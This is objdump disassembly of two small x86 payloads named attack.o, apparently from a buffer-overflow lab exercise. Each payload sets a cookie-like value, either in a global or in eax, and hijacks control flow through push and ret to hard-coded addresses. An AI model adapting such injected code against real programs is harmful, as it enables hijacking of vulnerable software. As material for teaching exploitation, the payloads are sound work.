
attack.o：     文件格式 elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:	c7 05 18 c2 04 08 90 	movl   $0x6898ac90,0x804c218
   7:	ac 98 68 
   a:	68 05 8d 04 08       	push   $0x8048d05
   f:	c3                   	ret    

attack.o：     文件格式 elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:	b8 90 ac 98 68       	mov    $0x6898ac90,%eax
   5:	68 e0 31 68 55       	push   $0x556831e0
   a:	5d                   	pop    %ebp
   b:	68 81 8e 04 08       	push   $0x8048e81
  10:	c3                   	ret    
